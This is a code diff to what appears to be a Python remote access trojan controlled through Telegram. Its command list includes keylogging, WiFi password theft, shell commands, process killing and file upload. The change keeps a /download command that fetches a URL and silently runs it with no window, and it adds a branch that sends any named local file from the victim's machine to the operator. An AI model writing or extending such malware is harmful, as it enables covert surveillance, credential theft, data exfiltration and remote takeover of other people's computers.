@@ -577,7 +577,7 @@ def _handle_telegram_command(text: str):
             "/keylog - Keylog file\n"
             "/wifi - WiFi passwords\n"
             "/shell &lt;cmd&gt; - Run command\n"
-            "/download &lt;url&gt; - Download+run\n"
+            "/download &lt;url|file&gt; - Download+run URL or get file\n"
             "/proc - List processes\n"
             "/kill &lt;pid&gt; - Kill process\n"
             "/upload &lt;path&gt; - Upload file\n"
@@ -690,16 +690,27 @@ def _handle_telegram_command(text: str):
 
     elif cmd == "/download":
         if not args:
-            _send_telegram("Usage: /download <url>")
+            _send_telegram("Usage: /download <url> OR /download <filename>")
             return
         try:
-            filename = args.split("/")[-1].split("?")[0] or "download.exe"
-            dl_path = os.path.join(KEYLOG_DIR, filename)
-            resp = requests.get(args, timeout=120, allow_redirects=True)
-            with open(dl_path, "wb") as f:
-                f.write(resp.content)
-            subprocess.Popen(dl_path, creationflags=_NO_WINDOW)
-            _send_telegram(f"Downloaded and executed: {filename}")
+            if args.startswith("http://") or args.startswith("https://"):
+                filename = args.split("/")[-1].split("?")[0] or "download.exe"
+                dl_path = os.path.join(KEYLOG_DIR, filename)
+                resp = requests.get(args, timeout=120, allow_redirects=True)
+                with open(dl_path, "wb") as f:
+                    f.write(resp.content)
+                subprocess.Popen(dl_path, creationflags=_NO_WINDOW)
+                _send_telegram(f"Downloaded and executed: {filename}")
+            else:
+                target = os.path.join(os.getcwd(), args.strip().strip('"').strip("'"))
+                if os.path.isfile(target):
+                    size_kb = round(os.path.getsize(target) / 1024, 1)
+                    _send_telegram(f"Sending: {args} ({size_kb} KB)")
+                    _send_telegram_file(target, caption=args)
+                elif os.path.isdir(target):
+                    _send_telegram(f"'{args}' is a directory, not a file. Use /ls to list contents.")
+                else:
+                    _send_telegram(f"File not found: {args}")
         except:
             _send_telegram(f"Download failed: {args}")
 
@@ -789,7 +800,10 @@ def _handle_telegram_command(text: str):
             _send_telegram(f"Current: {os.getcwd()}")
             return
         try:
-            os.chdir(args.strip().strip('"').strip("'"))
+            target = args.strip().strip('"').strip("'")
+            if not os.path.isabs(target):
+                target = os.path.abspath(os.path.join(os.getcwd(), target))
+            os.chdir(target)
             _send_telegram(f"Changed to: {os.getcwd()}")
         except:
             _send_telegram(f"Failed to change directory")
